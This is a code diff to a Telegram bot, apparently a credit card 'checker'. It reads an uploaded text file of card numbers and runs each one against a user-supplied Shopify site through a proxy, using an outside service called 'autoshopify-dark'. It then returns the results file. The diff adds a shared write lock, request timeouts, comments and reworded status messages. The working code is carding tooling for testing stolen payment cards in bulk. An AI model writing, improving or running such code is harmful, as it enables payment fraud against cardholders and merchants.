@@ -4699,6 +4699,7 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
     output_file_path = os.path.join(DOWNLOAD_FOLDER, f"results_{file_name}")
 
     async with aiohttp.ClientSession() as session:
+        # Read all cards from the uploaded file
         with open(file_path, "r", encoding="utf-8") as f:
             cards = [line.strip() for line in f if line.strip()]
 
@@ -4707,13 +4708,14 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
             return
 
         sem = asyncio.Semaphore(5)  # limit concurrency
+        lock = asyncio.Lock()       # protect writes
 
-        async def check_card(card):
+        async def check_card(card: str):
             async with sem:
                 api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}&proxy={PROXY}"
-                print("Checking:", api_url)
+                print(f"🔎 Checking: {card}")
                 try:
-                    async with session.get(api_url) as resp:
+                    async with session.get(api_url, timeout=30) as resp:
                         try:
                             data = await resp.json(content_type=None)
                             response_text = data.get("Response", "No Response")
@@ -4723,27 +4725,28 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
                 except Exception as e:
                     response_text = f"Request Error: {e}"
 
-                # Append each card result immediately
-                async with asyncio.Lock():
+                # Append result line into results file
+                async with lock:
                     with open(output_file_path, "a", encoding="utf-8") as out:
                         out.write(f"{card} => {response_text}\n")
+                print(f"✅ Done: {card} => {response_text}")
 
-        # Run all concurrently
+        # Run checks concurrently
         await asyncio.gather(*(check_card(card) for card in cards))
 
-    # Send final file when done
+    # Send the result file after processing
     if os.path.exists(output_file_path) and os.path.getsize(output_file_path) > 0:
         await update.message.reply_document(
             document=InputFile(output_file_path, filename=f"results_{file_name}")
         )
     else:
-        await update.message.reply_text("⚠️ Something went wrong, results empty.")
+        await update.message.reply_text("⚠️ Something went wrong, results file is empty.")
 
-    # Cleanup
+    # Cleanup temporary files
     try:
         os.remove(file_path)
         os.remove(output_file_path)
-    except:
+    except Exception:
         pass
 
 
@@ -4753,9 +4756,7 @@ async def mtxt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_data = await get_user(user_id)
 
     if not user_data or not user_data.get("custom_urls"):
-        await update.message.reply_text(
-            "You have not added any site. Please add your custom site first."
-        )
+        await update.message.reply_text("⚠️ You have not added any site. Please add your custom site first.")
         return
 
     site = user_data["custom_urls"]
@@ -4766,19 +4767,20 @@ async def mtxt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         document = update.message.reply_to_message.document
 
     if not document or not document.file_name.endswith(".txt"):
-        await update.message.reply_text("Please send or reply to a .txt file containing cards.")
+        await update.message.reply_text("⚠️ Please send or reply to a .txt file containing cards.")
         return
 
-    # Save file
+    # Save uploaded file
     file_path = os.path.join(DOWNLOAD_FOLDER, f"{update.message.message_id}_{document.file_name}")
     file = await document.get_file()
     await file.download_to_drive(file_path)
 
-    # Tell user we started
+    # Tell user processing started
     await update.message.reply_text("✅ Processing started, please wait…")
 
-    # Run processor in background
+    # Run background task
     asyncio.create_task(process_cards(update, file_path, document.file_name, site))
+
 
 
 
